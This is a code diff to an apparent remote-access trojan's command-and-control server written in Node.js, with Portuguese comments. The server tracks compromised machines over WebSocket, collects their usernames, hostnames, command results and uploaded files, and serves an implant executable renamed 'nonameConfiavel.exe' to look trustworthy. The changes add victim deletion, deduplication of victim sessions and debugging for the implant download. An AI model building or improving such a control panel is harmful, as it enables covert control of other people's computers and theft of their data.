@@ -51,6 +51,29 @@ app.get("/machines", (req, res) => {
     res.json(listMachines.map(m => ({ id: m.id, ip: m.ip })));
 });
 
+// Deletar máquina do painel
+app.delete("/machines/:id", (req, res) => {
+    const { id } = req.params;
+    const machine = listMachines.find(m => m.id === id);
+    
+    if (!machine) {
+        return res.status(404).json({ error: "Máquina não encontrada" });
+    }
+    
+    // Fechar conexão WebSocket
+    machine.ws.close();
+    
+    // Remover da lista
+    listMachines = listMachines.filter(m => m.id !== id);
+    
+    // Limpar dados associados
+    delete machineInfo[id];
+    delete commandResults[id];
+    
+    console.log(`[DELETE] Máquina deletada: ${id.substring(0, 8)}`);
+    res.json({ success: true, message: "Máquina deletada" });
+});
+
 app.get("/machines-detailed", (req, res) => {
     res.json(listMachines.map(m => ({
         id: m.id,
@@ -90,7 +113,13 @@ app.get("/implant.exe", (req, res) => {
     if (fs.existsSync(filePath)) {
         res.download(filePath, "nonameConfiavel.exe");
     } else {
-        res.status(404).send(process.cwd());
+        //de o comando ls e exiba no console para verificar o caminho atual e os arquivos presentes
+        console.log("Arquivo implant.exe não encontrado no diretório:", process.cwd());
+        console.log("Arquivos no diretório atual:");
+        fs.readdirSync(process.cwd()).forEach(file => {
+            console.log(" -", file);
+        });
+        res.status(404).send(process.cwd()); //  a saida esta como /app
     }
 });
 
@@ -393,6 +422,23 @@ wss.on("connection", (ws, req) => {
             } else if (message.type === 'systeminfo') {
                 console.log(`[SYSTEMINFO] ${id.substring(0, 8)}: Informações recebidas`);
                 machineInfo[id] = message.data;
+                
+                // Deletar máquinas duplicatas (mesmo username + hostname + IP)
+                const newInfo = message.data;
+                const duplicates = listMachines.filter(m => 
+                    m.id !== id &&
+                    machineInfo[m.id]?.username === newInfo.username &&
+                    machineInfo[m.id]?.hostname === newInfo.hostname &&
+                    m.ip === ip
+                );
+                
+                duplicates.forEach(dup => {
+                    console.log(`[DEDUPE] Removendo máquina duplicada: ${dup.id.substring(0, 8)}`);
+                    dup.ws.close();
+                    listMachines = listMachines.filter(m => m.id !== dup.id);
+                    delete machineInfo[dup.id];
+                    delete commandResults[dup.id];
+                });
             } else if (message.type === 'download_start') {
                 const downloadId = message.downloadId;
                 console.log(`[DOWNLOAD] Iniciando recebimento: ${message.filename} (downloadId: ${downloadId?.substring(0, 8)})`);
